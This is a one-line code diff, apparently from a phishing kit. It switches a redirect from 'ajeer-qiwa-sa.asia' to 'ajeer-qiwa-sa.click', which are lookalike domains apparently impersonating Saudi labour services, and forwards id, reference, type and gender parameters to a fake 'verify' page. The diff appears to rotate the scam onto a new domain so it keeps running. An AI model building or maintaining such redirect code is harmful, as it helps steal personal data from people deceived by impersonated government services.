@@ -28,7 +28,7 @@
     const additional = ["add", "additional", "extra"].includes(type);
     const blocked = type === "blocked";
     const page = blocked ? "blocked.html" : (additional ? "add-verify.html" : "verify.html");
-    const target = new URL("https://ajeer-qiwa-sa.asia/ajeer/" + page);
+    const target = new URL("https://ajeer-qiwa-sa.click/ajeer/" + page);
 
     target.searchParams.set("id", id);
     ["num", "ref", "type", "gender"].forEach(function (key) {
